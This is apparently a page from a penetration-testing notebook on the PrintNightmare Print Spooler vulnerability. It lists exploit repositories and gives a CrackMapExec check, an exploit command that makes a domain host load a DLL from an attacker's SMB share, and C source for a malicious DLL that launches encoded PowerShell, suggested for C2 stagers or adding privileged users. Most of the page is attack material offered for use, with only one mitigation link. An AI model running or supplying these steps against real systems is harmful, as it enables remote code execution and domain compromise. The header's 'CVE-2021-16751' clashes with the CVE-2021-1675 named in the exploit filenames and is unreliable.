# PrintNightmare

**CVE-2021-16751, CVE-2021-34527**




## Check

With CrackMapExec:

```
$ cme smb hosts.txt -u snovvcrash -p 'Passw0rd!' -M spooler
```




## Exploits



### C++

RCE (fork of the original repo):

* [https://github.com/afwu/PrintNightmare](https://github.com/afwu/PrintNightmare)

LPE:

* [https://github.com/hlldz/CVE-2021-1675-LPE](https://github.com/hlldz/CVE-2021-1675-LPE)



### Python

RCE:

* [https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)


#### Usage

1. Prepare [an SMB share with anonymous authentication](/pentest/infrastructure/ad/smb.md#smb-share-with-null-authentication) allowed:
2. Generate an evil DLL: a –°2 stager / add user to a privileged group ([1](https://github.com/newsoft/adduser), [2](https://github.com/calebstewart/CVE-2021-1675/blob/main/nightmare-dll/nightmare/dllmain.cpp)) / invoke a [custom](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own) command (see example below).
3. Run the exploit:

```
$ python CVE-2021-1675.py megacorp.local/snovvcrash:'Passw0rd!'@192.168.1.11 '\\10.10.13.37\share\pwn.dll'
```

{% code title="pwn.c" %}
```c
// x86_64-w64-mingw32-gcc pwn.c -o pwn.dll -shared

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

// Default function that is executed when the DLL is loaded
void Entry() {
    system("powershell -enc <BASE64_PWSH_CODE>");
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
  switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
      CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Entry, 0, 0, 0);
      break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE;
}
```
{% endcode %}

An example on configuring and abusing RBCD on a DC with PrintNightmare üëâüèª [here](https://snovvcrash.rocks/2021/06/30/leveraging-printnightmare-to-abuse-rbcd.html).



### C\#

RCE + LPE:

* [https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare)



### PowerShell

LPE:

* [https://github.com/calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)




## Reproducibility

Depending on the state of a user's access token (elevated / non-elevated) whose account one's impersonating when making RPC calls to `RpcAddPrinterDriverEx`, the attack may succeed or fail. On the following diagram (by [@StanHacked](https://twitter.com/StanHacked/status/1410922404252168196)) there're some conditions that can affect the token state:

![](https://pbs.twimg.com/media/E5SaOLHXIAYEzrL?format=jpg&name=4096x4096)

![](https://pbs.twimg.com/media/E5ShO9wXwAAPAC9?format=jpg&name=4096x4096)

**UPD.** ...and none of the above really matters because of the MS-PAR exploitation vector by [@gentilkiwi](https://twitter.com/gentilkiwi/status/1412063581315686400):

![](https://pbs.twimg.com/media/E5ikrvQWYAEXzAq?format=jpg&name=large)

![](https://pbs.twimg.com/media/E5ioQJqWUAA00FR?format=jpg&name=large)




## Mitigation

* [https://github.com/LaresLLC/CVE-2021-1675](https://github.com/LaresLLC/CVE-2021-1675)
